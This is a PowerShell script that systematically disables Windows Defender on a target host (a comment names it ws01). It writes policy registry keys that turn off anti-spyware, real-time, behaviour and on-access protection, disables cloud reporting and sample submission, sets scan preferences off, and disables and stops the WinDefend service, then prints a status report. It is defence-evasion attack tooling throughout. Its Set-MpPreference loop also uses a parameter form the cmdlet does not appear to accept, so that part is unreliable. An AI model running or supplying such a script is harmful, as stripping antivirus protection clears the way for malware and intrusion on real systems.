$ErrorActionPreference = "Continue"

$polPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$failures = @()

# Step 1: Policy registry keys (writable on ws01)
try {
  New-Item -Path $polPath -Force | Out-Null
  New-ItemProperty -Path $polPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction Stop
  Write-Output "POLICY DisableAntiSpyware=1 OK"
} catch { $failures += "DisableAntiSpyware: $($_.Exception.Message)"; Write-Output "FAIL DisableAntiSpyware $($_.Exception.Message)" }

try {
  $rtp = Join-Path $polPath "Real-Time Protection"
  New-Item -Path $rtp -Force | Out-Null
  New-ItemProperty -Path $rtp -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -Force -ErrorAction Stop
  New-ItemProperty -Path $rtp -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force -ErrorAction Stop
  New-ItemProperty -Path $rtp -Name "DisableOnAccessProtection" -Value 1 -Type DWord -Force -ErrorAction Stop
  New-ItemProperty -Path $rtp -Name "DisableIOAVProtection" -Value 1 -Type DWord -Force -ErrorAction Stop
  Write-Output "POLICY Real-Time Protection blocks OK"
} catch { $failures += "RTP: $($_.Exception.Message)"; Write-Output "FAIL RTP $($_.Exception.Message)" }

try {
  $spynet = Join-Path $polPath "SpyNet"
  New-Item -Path $spynet -Force | Out-Null
  New-ItemProperty -Path $spynet -Name "SpynetReporting" -Value 0 -Type DWord -Force -ErrorAction Stop
  New-ItemProperty -Path $spynet -Name "SubmitSamplesConsent" -Value 0 -Type DWord -Force -ErrorAction Stop
  Write-Output "POLICY SpyNet off OK"
} catch { $failures += "SpyNet: $($_.Exception.Message)"; Write-Output "FAIL SpyNet $($_.Exception.Message)" }

# Step 2: MpPreference — all protection layers
$mpCalls = @(
  @{n='DisableRealtimeMonitoring';v=$true}, @{n='DisableBehaviorMonitoring';v=$true},
  @{n='DisableIntrusionPreventionSystem';v=$true}, @{n='DisableScriptScanning';v=$true},
  @{n='DisableIOAVProtection';v=$true}, @{n='DisableBlockAtFirstSeen';v=$true},
  @{n='DisableArchiveScanning';v=$true}, @{n='MAPSReporting';v=0},
  @{n='SubmitSamplesConsent';v=0}, @{n='PUAProtection';v=0}, @{n='ScanScheduleDay';v=8}
)
foreach ($c in $mpCalls) {
  try {
    Set-MpPreference -Name $c.n -Value $c.v -Force -ErrorAction Stop
    Write-Output "MP $($c.n)=$($c.v) OK"
  } catch { $failures += "MpPreference $($c.n): $($_.Exception.Message)"; Write-Output "FAIL MP $($c.n) $($_.Exception.Message)" }
}

# Step 3: Try to stop + disable WinDefend service
try {
  Set-Service WinDefend -StartupType Disabled -ErrorAction Stop
  Write-Output "SERVICE WinDefend startup=Disabled OK"
} catch { $failures += "Set-Service: $($_.Exception.Message)"; Write-Output "FAIL Set-Service $($_.Exception.Message)" }
try {
  Stop-Service WinDefend -Force -ErrorAction Stop
  Write-Output "SERVICE WinDefend stopped OK"
} catch { $failures += "Stop-Service: $($_.Exception.Message)"; Write-Output "FAIL Stop-Service $($_.Exception.Message)" }

# Report
Write-Output "--- FINAL STATUS ---"
$st = Get-MpComputerStatus -ErrorAction SilentlyContinue
if ($st) {
  Write-Output "RTP=$($st.RealTimeProtectionEnabled) TP=$($st.IsTamperProtected) AV=$($st.AntivirusEnabled) AMSvc=$($st.AMServiceEnabled)"
}
$svc = Get-Service WinDefend -ErrorAction SilentlyContinue
if ($svc) {
  $sm = (Get-CimInstance Win32_Service -Filter "Name='WinDefend'").StartMode
  Write-Output "WINDEFEND=$($svc.Status)|startmode=$sm"
}
if ($failures.Count -gt 0) { Write-Output "FAILURES=$($failures.Count)"; $failures | ForEach-Object { Write-Output "F|$_" } }
Write-Output "DONE"
